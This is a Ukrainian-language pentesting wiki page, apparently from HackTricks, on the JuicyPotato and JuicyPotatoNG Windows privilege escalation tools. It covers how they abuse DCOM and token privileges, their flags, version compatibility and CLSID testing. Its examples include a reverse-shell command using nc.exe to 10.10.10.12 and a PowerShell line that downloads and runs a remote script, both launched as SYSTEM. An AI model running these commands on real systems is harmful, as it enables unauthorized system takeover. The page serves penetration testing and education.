# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato є legacy. Зазвичай він працює у версіях Windows до Windows 10 1803 / Windows Server 2016. Зміни, внесені Microsoft починаючи з Windows 10 1809 / Server 2019, зламали оригінальну техніку. Для цих і новіших збірок розгляньте сучасні альтернативи, такі як PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato та інші. Актуальні варіанти й приклади використання наведено на сторінці нижче.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (зловживання golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Покращена версія_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, із додатковою порцією juice, тобто **ще один інструмент Local Privilege Escalation, від Windows Service Accounts до NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Ви можете завантажити juicypotato з [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Короткі нотатки щодо сумісності

- Надійно працює до Windows 10 1803 і Windows Server 2016, якщо поточний контекст має SeImpersonatePrivilege або SeAssignPrimaryTokenPrivilege.
- Зламаний через hardening Microsoft у Windows 10 1809 / Windows Server 2019 і новіших версіях. Для цих збірок перевагу слід надавати наведеним вище альтернативам.

### Підсумок <a href="#summary" id="summary"></a>

[**З Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) та його [варіанти](https://github.com/decoder-it/lonelypotato) використовують ланцюжок privilege escalation, заснований на [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>), із MiTM listener на `127.0.0.1:6666`, коли у вас є привілеї `SeImpersonate` або `SeAssignPrimaryToken`. Під час перевірки збірки Windows ми виявили конфігурацію, де `BITS` було навмисно вимкнено, а порт `6666` уже використовувався.

Ми вирішили weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Зустрічайте Juicy Potato**.

> Теорію наведено в матеріалі [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/); також перегляньте ланцюжок посилань і references.<sup>[[4]](#references)</sup>

Окрім `BITS`, можна зловживати кількома COM servers. Вони мають лише:

1. бути доступними для instantiation поточним користувачем, зазвичай “service user”, який має impersonation privileges
2. реалізовувати інтерфейс `IMarshal`
3. працювати від імені elevated user (SYSTEM, Administrator, …)

Після кількох тестів ми отримали й перевірили великий список [цікавих CLSID’s](http://ohpe.it/juicy-potato/CLSID/) у кількох версіях Windows.

### Деталі Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato дозволяє:<sup>[[1]](#references)</sup>

- **Target CLSID** _вибрати будь-який потрібний CLSID._ [_Тут_](http://ohpe.it/juicy-potato/CLSID/) _можна знайти список, упорядкований за ОС._
- **COM Listening port** _визначити потрібний COM listening port (замість marshalled hardcoded 6666)_
- **COM Listening IP address** _прив’язати server до будь-якої IP-адреси_
- **Process creation mode** _залежно від привілеїв impersonated user можна вибрати:_
- `CreateProcessWithToken` (потрібен `SeImpersonate`)
- `CreateProcessAsUser` (потрібен `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _запустити executable або script, якщо exploitation буде успішною_
- **Process Argument** _налаштувати аргументи запущеного process_
- **RPC Server address** _для stealthy approach можна автентифікуватися на external RPC server_
- **RPC Server port** _корисно, якщо потрібно автентифікуватися на external server, а firewall блокує порт `135`…_
- **TEST mode** _переважно для testing purposes, тобто тестування CLSID. Він створює DCOM і виводить user token. Див._ [_тут для тестування_](http://ohpe.it/juicy-potato/Test/)

### Використання <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Підсумкові думки <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Якщо користувач має привілеї `SeImpersonate` або `SeAssignPrimaryToken`, то ви маєте права **SYSTEM**.

Майже неможливо запобігти зловживанню всіма цими COM Servers. Можна було б спробувати змінити дозволи цих об’єктів через `DCOMCNFG`, але це буде складно.

Фактичне рішення полягає в захисті конфіденційних облікових записів і застосунків, які працюють від імені облікових записів `* SERVICE`. Вимкнення `DCOM` безумовно перешкодило б цій експлуатації, але могло б серйозно вплинути на роботу базової OS.

Джерело: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG повторно впроваджує локальне підвищення привілеїв у стилі JuicyPotato на сучасних Windows шляхом поєднання:<sup>[[2]](#references)</sup>
- Розв’язання DCOM OXID до локального RPC server на вибраному порту, що усуває потребу в старому hardcoded listener на 127.0.0.1:6666.
- SSPI hook для захоплення та impersonate вхідної SYSTEM authentication без потреби в RpcImpersonateClient, що також дає змогу використовувати CreateProcessAsUser, коли наявний лише SeAssignPrimaryTokenPrivilege.
- Прийомів для виконання обмежень активації DCOM (наприклад, колишньої вимоги належності до групи INTERACTIVE під час націлювання на класи PrintNotify / ActiveX Installer Service).

Важливі примітки (поведінка змінюється залежно від build):<sup>[[2]](#references)</sup>
- Вересень 2022 року: початкова техніка працювала на підтримуваних цілях Windows 10/11 і Server із використанням “INTERACTIVE trick”.
- Оновлення від авторів за січень 2023 року: згодом Microsoft заблокувала INTERACTIVE trick. Інший CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) відновлює можливість exploitation, але, згідно з їхнім дописом, лише у Windows 11 / Server 2022.

Базове використання (більше flags наведено в help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Якщо ви націлені на Windows 10 1809 / Server 2019, де classic JuicyPotato виправлено, надавайте перевагу альтернативам, наведеним на початку (RoguePotato, PrintSpoofer, EfsPotato/GodPotato тощо). NG може працювати ситуативно залежно від build і стану service.

## Приклади

Примітка: відвідайте [цю сторінку](https://ohpe.it/juicy-potato/CLSID/), щоб переглянути список CLSID для спроби.

### Отримання reverse shell через nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Запуск нового CMD (якщо у вас є RDP-доступ)

![Powershell rev - Запуск нового CMD (якщо у вас є RDP-доступ): Запуск нового CMD (якщо у вас є RDP-доступ)](<../../images/image (300).png>)

## Проблеми CLSID

Досить часто стандартний CLSID, який використовує JuicyPotato, **не працює**, і exploit завершується невдало. Зазвичай потрібно здійснити кілька спроб, щоб знайти **робочий CLSID**. Щоб отримати список CLSID для перевірки в конкретній операційній системі, перейдіть на цю сторінку:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Перевірка CLSID**

Спочатку вам знадобляться деякі виконувані файли, окрім juicypotato.exe.

Завантажте [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) і завантажте його у свою PS-сесію, а потім завантажте та виконайте [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Цей скрипт створить список можливих CLSID для перевірки.

Потім завантажте [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(змініть шлях до списку CLSID і виконуваного файлу juicypotato) та виконайте його. Він почне перевіряти кожен CLSID, і **коли номер порту зміниться, це означатиме, що CLSID спрацював**.

**Перевірте** робочі CLSID **за допомогою параметра -c**

## References

- [1] [README Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Другий шанс для JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Сторінка проєкту Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - підвищення привілеїв від облікових записів служб до SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
